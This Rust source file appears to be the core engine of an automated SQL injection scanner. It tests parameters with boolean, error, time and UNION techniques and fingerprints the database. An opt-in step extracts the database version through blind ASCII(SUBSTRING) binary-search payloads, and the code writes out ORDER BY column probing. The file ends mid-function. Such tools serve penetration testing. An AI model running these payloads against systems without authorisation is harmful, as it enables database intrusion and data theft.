#![deny(unsafe_code)]

use crate::{
    detection::{baseline, confirmation},
    http::client::{HttpClient, RequestSpec},
    session::{
        scrubber::Scrubber,
        state::{Finding, SessionState, TechniqueKind},
    },
    target::{
        markers::MarkerSet,
        parameters::{ParameterLocation, TargetParameter},
        url::TargetUrl,
    },
    techniques::{
        boolean::{detector::BooleanDetector, payloads::boolean_payloads_for},
        error::detector::ErrorDetector,
        time::{detector::TimeDetector, payloads::time_payload_for},
        union::{detector::UnionDetector, payloads::union_payloads_for},
    },
};
use futures::StreamExt as _;
use http::Method;
use indicatif::{ProgressBar, ProgressStyle};
use std::{sync::Arc, time::Instant};
use tokio::sync::RwLock;
use tokio_util::sync::CancellationToken;
use tracing::{info, warn};

#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub enum EngineState {
    Parse,
    Baseline,
    Detection,
    Fingerprint,
    Extraction,
    Done,
}

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct EngineConfig {
    pub threads: usize,
    pub techniques: Vec<String>,
    pub allow_private: bool,
    pub no_redact: bool,
    pub extract: bool,
}

impl Default for EngineConfig {
    fn default() -> Self {
        Self {
            threads: 5,
            techniques: vec![
                "boolean".to_owned(),
                "time".to_owned(),
                "error".to_owned(),
                "union".to_owned(),
            ],
            allow_private: false,
            no_redact: false,
            extract: false,
        }
    }
}

#[derive(Debug)]
#[non_exhaustive]
pub struct Engine {
    config: EngineConfig,
    client: HttpClient,
    state: Arc<RwLock<SessionState>>,
    cancel: CancellationToken,
    scrubber: Scrubber,
}

impl Engine {
    #[must_use]
    pub fn new(config: EngineConfig, client: HttpClient, cancel: CancellationToken) -> Self {
        let scrubber = Scrubber::new(config.no_redact);
        Self {
            config,
            client,
            state: Arc::new(RwLock::new(SessionState::new())),
            cancel,
            scrubber,
        }
    }

    #[must_use]
    pub fn state_handle(&self) -> Arc<RwLock<SessionState>> {
        Arc::clone(&self.state)
    }

    pub async fn run(&self, target_str: &str) -> anyhow::Result<EngineState> {
        let mut current = EngineState::Parse;
        info!(target=%self.scrubber.scrub(target_str), state=?current, "engine start");

        // Parse
        let target = TargetUrl::parse(target_str, self.config.allow_private)
            .map_err(|e| anyhow::anyhow!("parse error: {e}"))?;
        current = EngineState::Baseline;
        info!(state=?current, "phase baseline");

        if self.cancel.is_cancelled() {
            return Ok(EngineState::Done);
        }

        // Baseline: 3-5 requests
        let pb = ProgressBar::new_spinner();
        pb.set_style(
            ProgressStyle::default_spinner()
                .template("{spinner} {msg}")
                .unwrap_or_else(|_| ProgressStyle::default_spinner()),
        );
        pb.set_message("collecting baseline…");
        pb.enable_steady_tick(std::time::Duration::from_millis(80));

        let mut samples = Vec::new();
        for _ in 0..3 {
            if self.cancel.is_cancelled() {
                break;
            }
            let start = Instant::now();
            let resp = self
                .client
                .send_with_retry(
                    RequestSpec {
                        method: Method::GET,
                        url: target.as_str().to_owned(),
                        headers: http::HeaderMap::new(),
                        body: None,
                    },
                    &self.cancel,
                )
                .await;
            let elapsed = start.elapsed();
            match resp {
                Ok(r) => {
                    let status = r.status().as_u16();
                    let body = match r.bytes().await {
                        Ok(b) => b.to_vec(),
                        Err(e) => {
                            warn!(error=%e, "baseline body read failed");
                            Vec::new()
                        }
                    };
                    samples.push(baseline::Sample {
                        status,
                        body,
                        duration: elapsed,
                    });
                    self.state.write().await.increment_requests();
                }
                Err(e) => warn!(error=%e, "baseline request failed"),
            }
        }
        pb.finish_with_message("baseline done");
        let baseline = baseline::Baseline::new(samples);
        if baseline.is_waf_blocked() {
            warn!("possible WAF detected (repeated 403/406)");
        }
        current = EngineState::Detection;
        info!(state=?current, "phase detection");

        // Detection per parameter — bounded concurrency via buffer_unordered
        let marker_set = MarkerSet::detect(target_str);
        let mut params = Vec::new();
        // Marker mode: synthetic params, but also test real query params (don't ignore them)
        if marker_set.asterisk {
            params.push(TargetParameter::new(
                "marker_asterisk",
                ParameterLocation::Query,
                "*",
            ));
        }
        if marker_set.section {
            params.push(TargetParameter::new(
                "marker_section",
                ParameterLocation::Query,
                "§",
            ));
        }
        if marker_set.double_brace {
            params.push(TargetParameter::new(
                "marker_brace",
                ParameterLocation::Query,
                "{{}}",
            ));
        }
        // Always include real query params even when markers present (fixes #6)
        params.extend(crate::target::parameters::collect_from_url_query(&target));
        let to_test: Vec<TargetParameter> = if params.is_empty() {
            vec![TargetParameter::new("id", ParameterLocation::Query, "1")]
        } else {
            params
        };

        let pb2 = Arc::new(ProgressBar::new(to_test.len() as u64));
        pb2.set_style(
            ProgressStyle::default_bar()
                .template("{bar:40} {pos}/{len} {msg}")
                .unwrap_or_else(|_| ProgressStyle::default_bar()),
        );

        // Bounded concurrent testing per parameter (respects --threads)
        let concurrency = self.config.threads.clamp(1, 32);
        let target_str_owned = target_str.to_owned();
        let baseline_clone = baseline.clone();
        let target_clone = target.clone();
        let marker_set_clone = marker_set.clone();

        let stream = futures::stream::iter(to_test)
            .map(|param| {
                let target = target_clone.clone();
                let target_str = target_str_owned.clone();
                let baseline = baseline_clone.clone();
                let marker_set = marker_set_clone.clone();
                let client = self.client.clone();
                let state = Arc::clone(&self.state);
                let cancel = self.cancel.clone();
                let config = self.config.clone();
                let pb2 = Arc::clone(&pb2);
                async move {
                    if cancel.is_cancelled() {
                        pb2.inc(1);
                        return;
                    }
                    // Boolean with confirmation (3 trials)
                    if config
                        .techniques
                        .iter()
                        .any(|t| t == "boolean" || t == "all")
                    {
                        test_boolean_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                        )
                        .await;
                    }
                    if config.techniques.iter().any(|t| t == "error" || t == "all") {
                        test_error_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &marker_set,
                        )
                        .await;
                    }
                    if config.techniques.iter().any(|t| t == "time" || t == "all") {
                        test_time_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                        )
                        .await;
                    }
                    if config.techniques.iter().any(|t| t == "union" || t == "all") {
                        test_union_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                        )
                        .await;
                    }
                    pb2.inc(1);
                }
            })
            .buffer_unordered(concurrency);

        stream.collect::<Vec<()>>().await;
        pb2.finish_with_message("detection done");
        current = EngineState::Fingerprint;
        info!(state=?current, "phase fingerprint");

        // Fingerprint: passive guess from error findings + banner regex, then fill missing dbms for boolean/time
        {
            let findings_snapshot = self.state.read().await.findings().to_vec();
            if let Some(kind) = crate::dbms::fingerprint::guess_from_findings(&findings_snapshot) {
                let mut st = self.state.write().await;
                st.fill_missing_dbms(kind.clone());
                info!(dbms=%kind, "fingerprint guessed from findings");
            } else if !findings_snapshot.is_empty() {
                // Try banner extraction from evidences
                for f in &findings_snapshot {
                    if let Some((kind, ver)) =
                        crate::dbms::fingerprint::extract_banner_version(&f.evidence)
                    {
                        let mut st = self.state.write().await;
                        st.fill_missing_dbms(kind.clone());
                        info!(dbms=%kind, version=%ver, "fingerprint banner detected");
                        break;
                    }
                }
            }
        }

        if self.config.extract {
            current = EngineState::Extraction;
            info!(state=?current, "phase extraction — inference (opt-in)");

            // Pick first finding's param as injection point for extraction
            let (first_param, target_for_extract) = {
                let st = self.state.read().await;
                let f = st.findings().first().cloned();
                drop(st);
                if let Some(finding) = f {
                    // Recover param from finding.parameter "name@location" (e.g., "id@query", "user@body", "X-Header@header:X-Header")
                    let (name, loc_str) = match finding.parameter.split_once('@') {
                        Some((n, l)) => (n.to_owned(), l.to_owned()),
                        None => (finding.parameter.clone(), "query".to_owned()),
                    };
                    let location = if loc_str == "query" {
                        ParameterLocation::Query
                    } else if loc_str == "body" {
                        ParameterLocation::Body
                    } else if loc_str == "cookie" {
                        ParameterLocation::Cookie
                    } else if let Some(h) = loc_str.strip_prefix("header:") {
                        ParameterLocation::Header(h.to_owned())
                    } else {
                        // Fallback: treat any unknown as Query, but preserve marker handling via name prefix
                        ParameterLocation::Query
                    };
                    (TargetParameter::new(name, location, "1"), target.clone())
                } else {
                    // fallback synthetic
                    (
                        TargetParameter::new("id", ParameterLocation::Query, "1"),
                        target.clone(),
                    )
                }
            };

            // Determine DBMS for extraction query
            let dbms_kind = {
                let snap = self.state.read().await.findings().to_vec();
                crate::dbms::fingerprint::guess_from_findings(&snap)
                    .unwrap_or(crate::dbms::DbmsKind::MySql)
            };
            let version_query = match dbms_kind {
                crate::dbms::DbmsKind::MySql => "SELECT @@version",
                crate::dbms::DbmsKind::Postgres => "SELECT version()",
                crate::dbms::DbmsKind::MsSql => "SELECT @@version",
                crate::dbms::DbmsKind::Oracle => "SELECT banner FROM v$version WHERE ROWNUM=1",
                crate::dbms::DbmsKind::Unknown => "SELECT @@version",
            };

            // Build oracle: ASCII(SUBSTRING((query), pos+1, 1)) >= mid
            let baseline_body = baseline.representative_body_str();
            let baseline_mean = baseline.mean_ms;
            let client_clone = self.client.clone();
            let state_clone = Arc::clone(&self.state);
            let cancel_clone = self.cancel.clone();
            let target_str_clone = target_str.to_owned();
            let target_clone2 = target_for_extract.clone();
            let first_param_clone = first_param.clone();
            let marker_set_clone = marker_set.clone();

            // First, infer length via LENGTH(query) if possible (try lengths 1..64)
            // Use retry per guess to mitigate single WAF/network hiccup; require 2 trials.
            let mut inferred_len: usize = 0;
            for len_guess in 1..=64usize {
                if cancel_clone.is_cancelled() {
                    break;
                }
                let payload = match dbms_kind {
                    crate::dbms::DbmsKind::MySql => {
                        format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                    }
                    crate::dbms::DbmsKind::Postgres => {
                        format!("' AND LENGTH(({version_query})::text)>={len_guess} --")
                    }
                    crate::dbms::DbmsKind::MsSql => {
                        format!("' AND LEN(({version_query}))>={len_guess} --")
                    }
                    crate::dbms::DbmsKind::Oracle => {
                        format!("' AND LENGTH(({version_query}))>={len_guess} --")
                    }
                    crate::dbms::DbmsKind::Unknown => {
                        format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                    }
                };
                // Retry logic: require 2 probes, treat as true only if majority true
                let mut true_count = 0usize;
                for _ in 0..2 {
                    let spec = build_injection_spec(
                        &target_clone2,
                        &target_str_clone,
                        &first_param_clone,
                        &payload,
                        &marker_set_clone,
                    );
                    let start = Instant::now();
                    let resp = client_clone.send_with_retry(spec, &cancel_clone).await;
                    let ms = start.elapsed().as_secs_f64() * 1000.0;
                    state_clone.write().await.increment_requests();
                    let body = match resp {
                        Ok(r) => r.text().await.unwrap_or_default(),
                        Err(_) => String::new(),
                    };
                    let diff = crate::detection::response_diff::diff_against_baseline(
                        &baseline_body,
                        &body,
                        baseline_mean,
                        ms,
                        100.0,
                    );
                    if diff.confidence < 0.4 {
                        true_count += 1;
                    }
                    // small jitter between retries
                    if cancel_clone.is_cancelled() {
                        break;
                    }
                }
                let is_true = true_count >= 1; // at least one true (tolerate single hiccup)
                // If we saw 0 true after 2 trials, length guess exceeded
                if !is_true {
                    inferred_len = len_guess - 1;
                    break;
                }
                if len_guess == 64 {
                    inferred_len = 64;
                }
            }
            if inferred_len == 0 {
                warn!("length inference failed, falling back to 16");
                inferred_len = 16; // fallback with warning
            }
            info!(len=%inferred_len, "inferred version length");

            // Now extract string char by char via binary search oracle
            let engine = crate::extraction::engine::ExtractionEngine::new(
                crate::extraction::engine::ExtractionConfig::default(),
            );
            let dbms_for_closure = dbms_kind.clone();
            let version_query_owned = version_query.to_owned();
            let baseline_body2 = baseline_body.clone();
            let baseline_mean2 = baseline_mean;
            let client_for_oracle = client_clone.clone();
            let state_for_oracle = state_clone.clone();
            let cancel_for_oracle = cancel_clone.clone();
            let target_for_oracle = target_clone2.clone();
            let param_for_oracle = first_param_clone.clone();
            let marker_for_oracle = marker_set_clone.clone();

            let target_str_for_oracle = target_str_clone.clone();
            let oracle = move |pos: usize, mid: u8| {
                let client = client_for_oracle.clone();
                let state = state_for_oracle.clone();
                let cancel = cancel_for_oracle.clone();
                let target = target_for_oracle.clone();
                let param = param_for_oracle.clone();
                let marker_set = marker_for_oracle.clone();
                let baseline_body = baseline_body2.clone();
                let version_query = version_query_owned.clone();
                let dbms_kind = dbms_for_closure.clone();
                let target_str = target_str_for_oracle.clone();
                async move {
                    // build ASCII(SUBSTRING) >= mid payload
                    let payload = match dbms_kind {
                        crate::dbms::DbmsKind::MySql => format!(
                            "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
                            pos + 1,
                            mid
                        ),
                        crate::dbms::DbmsKind::Postgres => format!(
                            "' AND ASCII(SUBSTRING(({version_query})::text,{},1))>={} --",
                            pos + 1,
                            mid
                        ),
                        crate::dbms::DbmsKind::MsSql => format!(
                            "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} --",
                            pos + 1,
                            mid
                        ),
                        crate::dbms::DbmsKind::Oracle => format!(
                            "' AND ASCII(SUBSTR(({version_query}),{},1))>={} --",
                            pos + 1,
                            mid
                        ),
                        crate::dbms::DbmsKind::Unknown => format!(
                            "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
                            pos + 1,
                            mid
                        ),
                    };
                    // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling
                    let spec =
                        build_injection_spec(&target, &target_str, &param, &payload, &marker_set);
                    let start = Instant::now();
                    let resp = client.send_with_retry(spec, &cancel).await;
                    let ms = start.elapsed().as_secs_f64() * 1000.0;
                    state.write().await.increment_requests();
                    let body = match resp {
                        Ok(r) => r.text().await.unwrap_or_default(),
                        Err(_) => String::new(),
                    };
                    let diff = crate::detection::response_diff::diff_against_baseline(
                        &baseline_body,
                        &body,
                        baseline_mean2,
                        ms,
                        100.0,
                    );
                    // similar => true (>= mid)
                    diff.confidence < 0.4
                }
            };

            let extracted = engine.extract(inferred_len, oracle).await;
            let exposed = {
                use secrecy::ExposeSecret;
                extracted.expose_secret().to_owned()
            };
            info!(extracted=%Scrubber::hash_truncated(&exposed), len=%exposed.len(), "extraction done");
            // scrubbed hash logged, raw stored as SecretString zeroized after report
            self.state.write().await.push_extracted(extracted);
        }

        current = EngineState::Done;
        info!(state=?current, requests=self.state.read().await.request_count(), "engine done");
        Ok(current)
    }

    #[allow(dead_code)]
    async fn test_boolean(
        &self,
        target: &TargetUrl,
        param: &TargetParameter,
        baseline: &baseline::Baseline,
    ) {
        let payloads = boolean_payloads_for(None);
        let detector = BooleanDetector::new();
        for p in payloads.iter().take(2) {
            if self.cancel.is_cancelled() {
                break;
            }
            // craft urls with payloads
            let true_url = inject_param(target, param, &p.true_payload);
            let false_url = inject_param(target, param, &p.false_payload);

            let (true_body, true_ms) =
                fetch_body_and_time(&self.client, &true_url, &self.state).await;
            let (false_body, false_ms) =
                fetch_body_and_time(&self.client, &false_url, &self.state).await;

            let baseline_body = baseline.representative_body_str();
            let res = detector.evaluate(
                &baseline_body,
                &true_body,
                &false_body,
                baseline.mean_ms,
                true_ms,
                false_ms,
            );
            if res.is_vulnerable && res.confidence > 0.6 {
                let evidence = format!(
                    "boolean true_sim={:.2} false_sim={:.2}",
                    res.true_similarity, res.false_similarity
                );
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Boolean,
                    res.confidence,
                    evidence,
                );
                finding.dbms = None;
                self.state.write().await.push_finding(finding);
                break;
            }
        }
    }

    #[allow(dead_code)]
    async fn test_error(&self, target: &TargetUrl, param: &TargetParameter) {
        let detector = ErrorDetector::new();
        let payloads = crate::techniques::error::payloads::error_payloads_for(None);
        for p in payloads.iter().take(2) {
            if self.cancel.is_cancelled() {
                break;
            }
            let url = inject_param(target, param, &p.payload);
            let (body, _ms) = fetch_body_and_time(&self.client, &url, &self.state).await;
            let r = detector.evaluate(&body);
            if r.is_vulnerable {
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Error,
                    r.confidence,
                    format!("error pattern {:?}", r.matched_pattern),
                );
                finding.dbms = Some(p.dbms.clone());
                self.state.write().await.push_finding(finding);
                break;
            }
        }
    }

    #[allow(dead_code)]
    async fn test_time(
        &self,
        target: &TargetUrl,
        param: &TargetParameter,
        baseline: &baseline::Baseline,
    ) {
        let detector = TimeDetector::new(baseline.mean_ms, baseline.stddev_ms);
        let payload = time_payload_for(None, 3.0);
        let url = inject_param(target, param, &payload.payload);
        let (_body, ms) = fetch_body_and_time(&self.client, &url, &self.state).await;
        let r = detector.evaluate(ms, payload.sleep_secs);
        if r.is_vulnerable {
            let finding = Finding::new(
                target.as_str(),
                param.key(),
                TechniqueKind::Time,
                r.confidence,
                format!(
                    "time delay {:.0}ms > threshold {:.0}ms",
                    r.measured_ms,
                    detector.threshold()
                ),
            );
            self.state.write().await.push_finding(finding);
        }
    }
}

fn inject_param(target: &TargetUrl, param: &TargetParameter, payload: &str) -> String {
    // naive: replace query param value
    let mut url = target.inner().clone();
    let mut pairs: Vec<(String, String)> = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();
    let mut found = false;
    for (k, v) in &mut pairs {
        if k == &param.name {
            *v = payload.to_owned();
            found = true;
        }
    }
    if !found {
        pairs.push((param.name.clone(), payload.to_owned()));
    }
    url.query_pairs_mut().clear();
    for (k, v) in pairs {
        url.query_pairs_mut().append_pair(&k, &v);
    }
    url.to_string()
}

#[allow(clippy::collapsible_if)]
fn inject_with_marker(target_str: &str, payload: &str, marker_set: &MarkerSet) -> String {
    let mut s = target_str.to_owned();
    if marker_set.asterisk {
        if s.contains('*') {
            // Replace only first occurrence to avoid over-broad replacement
            if let Some(pos) = s.find('*') {
                s.replace_range(pos..pos + 1, payload);
                return s;
            }
        } else {
            // Handle encoded asterisk %2A (case-insensitive) when URL is percent-encoded
            let lower = s.to_ascii_lowercase();
            if let Some(pos) = lower.find("%2a") {
                s.replace_range(pos..pos + 3, payload);
                return s;
            }
        }
    }
    if marker_set.section {
        // §payload§ -> replace inner
        if let Some(start) = s.find('§')
            && let Some(end) = s[start + '§'.len_utf8()..].find('§')
        {
            let sec_end = start + '§'.len_utf8() + end + '§'.len_utf8();
            s.replace_range(start..sec_end, payload);
            return s;
        }
    }
    if marker_set.double_brace && s.contains("{{") && s.contains("}}") {
        if let Some(start) = s.find("{{")
            && let Some(end) = s[start..].find("}}")
        {
            let brace_end = start + end + "}}".len();
            s.replace_range(start..brace_end, payload);
            return s;
        }
    }
    // fallback: append as query
    if s.contains('?') {
        format!("{s}&injekt={payload}")
    } else {
        format!("{s}?injekt={payload}")
    }
}

#[allow(dead_code)]
fn inject_param_or_marker(
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
) -> String {
    if marker_set.has_any() && param.name.starts_with("marker_") {
        inject_with_marker(target_str, payload, marker_set)
    } else {
        inject_param(target, param, payload)
    }
}

fn inject_body_param(
    raw: Option<&crate::target::raw_request::RawRequest>,
    param: &TargetParameter,
    payload: &str,
) -> (Method, String, http::HeaderMap) {
    let method = raw
        .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
        .unwrap_or(Method::POST);
    let existing_body = raw.and_then(|r| r.body.as_deref());
    let body_str = if let Some(body) = existing_body {
        // Preserve other body fields, replace only target param
        let mut pairs: Vec<(String, String)> = url::form_urlencoded::parse(body.as_bytes())
            .map(|(k, v)| (k.into_owned(), v.into_owned()))
            .collect();
        let mut found = false;
        for (k, v) in &mut pairs {
            if k == &param.name {
                *v = payload.to_owned();
                found = true;
            }
        }
        if !found {
            pairs.push((param.name.clone(), payload.to_owned()));
        }
        url::form_urlencoded::Serializer::new(String::new())
            .extend_pairs(pairs)
            .finish()
    } else {
        format!(
            "{}={}",
            param.name,
            url::form_urlencoded::byte_serialize(payload.as_bytes()).collect::<String>()
        )
    };
    let mut headers = http::HeaderMap::new();
    headers.insert(
        http::header::CONTENT_TYPE,
        http::HeaderValue::from_static("application/x-www-form-urlencoded"),
    );
    // Preserve other headers from raw request (e.g., Host, User-Agent)
    if let Some(r) = raw {
        for (k, v) in &r.headers {
            if k.eq_ignore_ascii_case("content-type") || k.eq_ignore_ascii_case("content-length") {
                continue;
            }
            if let (Ok(name), Ok(val)) = (
                http::HeaderName::from_bytes(k.as_bytes()),
                http::HeaderValue::from_str(v),
            ) {
                headers.insert(name, val);
            }
        }
    }
    (method, body_str, headers)
}

fn build_injection_spec(
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
) -> RequestSpec {
    build_injection_spec_with_raw(target, target_str, param, payload, marker_set, None)
}

fn build_injection_spec_with_raw(
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
    raw: Option<&crate::target::raw_request::RawRequest>,
) -> RequestSpec {
    if marker_set.has_any() && param.name.starts_with("marker_") {
        let url = inject_with_marker(target_str, payload, marker_set);
        // Preserve method from raw request if available
        let method = raw
            .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
            .unwrap_or(Method::GET);
        return RequestSpec::new(method, url);
    }
    match &param.location {
        ParameterLocation::Query => {
            let url = inject_param(target, param, payload);
            let method = raw
                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
                .unwrap_or(Method::GET);
            RequestSpec::new(method, url)
        }
        ParameterLocation::Body => {
            let (method, body_str, headers) = inject_body_param(raw, param, payload);
            RequestSpec::new(method, target.as_str().to_owned())
                .with_headers(headers)
                .with_body(body_str.into_bytes())
        }
        ParameterLocation::Header(h) => {
            let mut headers = http::HeaderMap::new();
            // Preserve existing headers from raw request
            if let Some(r) = raw {
                for (k, v) in &r.headers {
                    if let (Ok(name), Ok(val)) = (
                        http::HeaderName::from_bytes(k.as_bytes()),
                        http::HeaderValue::from_str(v),
                    ) {
                        headers.insert(name, val);
                    }
                }
            }
            if let (Ok(name), Ok(val)) = (
                http::HeaderName::from_bytes(h.as_bytes()),
                http::HeaderValue::from_str(payload),
            ) {
                headers.insert(name, val);
            }
            let method = raw
                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
                .unwrap_or(Method::GET);
            RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers)
        }
        ParameterLocation::Cookie => {
            let mut headers = http::HeaderMap::new();
            // Preserve existing headers, but rebuild Cookie header to preserve other cookies
            let mut cookies: Vec<(String, String)> = Vec::new();
            if let Some(r) = raw {
                for (k, v) in &r.headers {
                    if k.eq_ignore_ascii_case("cookie") {
                        for part in v.split(';') {
                            if let Some((ck, cv)) = part.trim().split_once('=') {
                                cookies.push((ck.trim().to_owned(), cv.trim().to_owned()));
                            }
                        }
                    } else if let (Ok(name), Ok(val)) = (
                        http::HeaderName::from_bytes(k.as_bytes()),
                        http::HeaderValue::from_str(v),
                    ) {
                        headers.insert(name, val);
                    }
                }
            }
            // Replace or insert target cookie
            let mut found = false;
            for (ck, cv) in &mut cookies {
                if ck == &param.name {
                    *cv = payload.to_owned();
                    found = true;
                }
            }
            if !found {
                cookies.push((param.name.clone(), payload.to_owned()));
            }
            let cookie_val = cookies
                .into_iter()
                .map(|(k, v)| format!("{k}={v}"))
                .collect::<Vec<_>>()
                .join("; ");
            if let Ok(val) = http::HeaderValue::from_str(&cookie_val) {
                headers.insert(http::header::COOKIE, val);
            }
            let method = raw
                .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
                .unwrap_or(Method::GET);
            RequestSpec::new(method, target.as_str().to_owned()).with_headers(headers)
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn fetch_for_payload(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
) -> (String, f64) {
    let spec = build_injection_spec(target, target_str, param, payload, marker_set);
    let start = Instant::now();
    let resp = client.send_with_retry(spec, cancel).await;
    let elapsed = start.elapsed().as_secs_f64() * 1000.0;
    state.write().await.increment_requests();
    match resp {
        Ok(r) => {
            #[allow(clippy::unwrap_used)]
            let body = r.text().await.unwrap_or_default();
            (body, elapsed)
        }
        Err(_) => (String::new(), elapsed),
    }
}

#[allow(dead_code)]
async fn fetch_body_and_time(
    client: &HttpClient,
    url: &str,
    state: &Arc<RwLock<SessionState>>,
) -> (String, f64) {
    let start = Instant::now();
    let resp = client.get_with_retry(url.to_owned()).await;
    let elapsed_ms = start.elapsed().as_secs_f64() * 1000.0;
    state.write().await.increment_requests();
    match resp {
        Ok(r) => {
            let body = r.text().await.unwrap_or_default();
            (body, elapsed_ms)
        }
        Err(_) => (String::new(), elapsed_ms),
    }
}

#[allow(dead_code)]
async fn fetch_body_and_time_spec(
    client: &HttpClient,
    url: String,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
) -> (String, f64) {
    let start = Instant::now();
    let spec = RequestSpec {
        method: Method::GET,
        url,
        headers: http::HeaderMap::new(),
        body: None,
    };
    let resp = client.send_with_retry(spec, cancel).await;
    let elapsed_ms = start.elapsed().as_secs_f64() * 1000.0;
    state.write().await.increment_requests();
    match resp {
        Ok(r) => {
            #[allow(clippy::unwrap_used)]
            let body = r.text().await.unwrap_or_default();
            (body, elapsed_ms)
        }
        Err(_) => (String::new(), elapsed_ms),
    }
}

#[allow(clippy::too_many_arguments)]
async fn test_boolean_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
) {
    let payloads = boolean_payloads_for(None);
    let detector = BooleanDetector::new();
    let baseline_body = baseline.representative_body_str();
    for p in payloads.iter().take(2) {
        if cancel.is_cancelled() {
            break;
        }
        // 3 trials confirmation
        let mut trials: Vec<(bool, f64)> = Vec::with_capacity(3);
        let mut last_res: Option<crate::techniques::boolean::detector::BooleanResult> = None;
        for _ in 0..3 {
            if cancel.is_cancelled() {
                break;
            }
            let (true_body, true_ms) = fetch_for_payload(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                &p.true_payload,
                marker_set,
            )
            .await;
            let (false_body, false_ms) = fetch_for_payload(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                &p.false_payload,
                marker_set,
            )
            .await;
            let res = detector.evaluate(
                &baseline_body,
                &true_body,
                &false_body,
                baseline.mean_ms,
                true_ms,
                false_ms,
            );
            trials.push((res.is_vulnerable, res.confidence));
            last_res = Some(res);
        }
        let conf = confirmation::confirm(&trials);
        if conf.confirmed {
            let res = last_res.unwrap_or_else(|| {
                detector.evaluate(&baseline_body, "", "", baseline.mean_ms, 0.0, 0.0)
            });
            let evidence = format!(
                "boolean true_sim={:.2} false_sim={:.2} trials={}/3 fp={:.2}",
                res.true_similarity, res.false_similarity, conf.trials, conf.false_positive_prob
            );
            let mut finding = Finding::new(
                target.as_str(),
                param.key(),
                TechniqueKind::Boolean,
                conf.score,
                evidence,
            );
            finding.dbms = None;
            state.write().await.push_finding(finding);
            break;
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn test_error_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    marker_set: &MarkerSet,
) {
    let detector = ErrorDetector::new();
    let payloads = crate::techniques::error::payloads::error_payloads_for(None);
    for p in payloads.iter().take(2) {
        if cancel.is_cancelled() {
            break;
        }
        let (body, _ms) = fetch_for_payload(
            client, state, cancel, target, target_str, param, &p.payload, marker_set,
        )
        .await;
        let r = detector.evaluate(&body);
        if r.is_vulnerable {
            let mut finding = Finding::new(
                target.as_str(),
                param.key(),
                TechniqueKind::Error,
                r.confidence,
                format!("error pattern {:?}", r.matched_pattern),
            );
            finding.dbms = Some(p.dbms.clone());
            state.write().await.push_finding(finding);
            break;
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn test_time_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
) {
    let detector = TimeDetector::new(baseline.mean_ms, baseline.stddev_ms);
    let payload = time_payload_for(None, 3.0);
    let (_body, ms) = fetch_for_payload(
        client,
        state,
        cancel,
        target,
        target_str,
        param,
        &payload.payload,
        marker_set,
    )
    .await;
    let r = detector.evaluate(ms, payload.sleep_secs);
    if r.is_vulnerable {
        let finding = Finding::new(
            target.as_str(),
            param.key(),
            TechniqueKind::Time,
            r.confidence,
            format!(
                "time delay {:.0}ms > threshold {:.0}ms",
                r.measured_ms,
                detector.threshold()
            ),
        );
        state.write().await.push_finding(finding);
    }
}

/// Enumerate column count via ORDER BY probing before UNION.
/// Sequential probing `ORDER BY 1 .. MAX`, stops at first error detected by
/// `UnionDetector::evaluate_order_by`. Returns `Some(n)` where `n = failed_index - 1`.
/// Rate limiting and jitter are preserved via `fetch_for_payload`; cancellation is honoured.
#[allow(clippy::too_many_arguments)]
async fn enumerate_columns_via_order_by(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    marker_set: &MarkerSet,
    detector: &UnionDetector,
) -> Option<usize> {
    const MAX_ORDER_BY_COLS: usize = 10;
    for i in 1..=MAX_ORDER_BY_COLS {
        if cancel.is_cancelled() {
            return None;
        }
        let payload = format!("' ORDER BY {i} -- -");
        let (body, _ms) = fetch_for_payload(
            client, state, cancel, target, target_str, param, &payload, marker_set,
        )
        .await;
        if detector.evaluate_order_by(&body) {
            if i == 1 {
